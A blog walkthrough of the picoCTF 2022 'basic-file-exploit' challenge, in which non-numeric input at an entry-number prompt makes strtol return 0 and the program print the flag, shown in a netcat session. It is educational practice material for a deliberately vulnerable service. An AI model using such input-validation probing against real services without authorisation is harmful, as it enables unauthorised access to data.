---
title: "pico22/pwn: basic-file-exploit"
date: 2022-04-05 12:16:07
tags:
- ctf
- pico22
- pwn
description: "Learn how to pass unexpected datatypes into ELF binaries to break the code! This is my writeup for the picoCTF 2022 binary/pwn challenge \"basic-file-exploit\"."
permalink: ctfs/pico22/pwn/basic-file-exploit/
thumbnail: https://enscribe.dev/asset/banner/banner-ctfs.png
---

<style>
    .box {
        border: 1px solid rgba(100, 100, 100, .5);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
    }
    .flex-container {
        display: flex;
        flex-wrap: nowrap;
        justify-content: center;
    }
</style>

<p class="box">
The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!<br>Connect to the program with netcat: <code>$ nc saturn.picoctf.net 50366</code><br>
The program's source code with the flag redacted can be downloaded  <a href="https://artifacts.picoctf.net/c/538/program-redacted.c">here</a>.</p>

Let's run that `nc` command to see what's going on.

```text
$ nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
```

Since this is binary exploitation, we're probably looking for something that the user can input which breaks the code.
To see what we can break, enter the source code given to you (the file called `program-redacted.c`):

```bash
nano program-redacted.c
```

Let's look for the flag:

```c
static const char* flag = "[REDACTED]";
```

Well, that doesn't help. Let's keep looking.

```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```

Here, the flag is going to be printed if this condition is met. Google defines `strtol()` as a function that "converts the initial part of the string in **str** to a **long int** value according to the given **base**". To break it, we need to input something that is **unconvertable into a long integer**. In this case, it would be letters! This statement is within the `static void data_read()` function. Let's see where it's called:

```c
 } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
```

We should be pressing the command `2` to read from the stored data (once we write it with the `1` command). Once it prompts us with "Read successful..." we should input letters to break it. Let's head back to the `netcat` and test it out:

```text
$ nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
hello
hello
Please enter the length of your data:
5
5
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
"NO!"
"NO!"
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_********}
```

<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
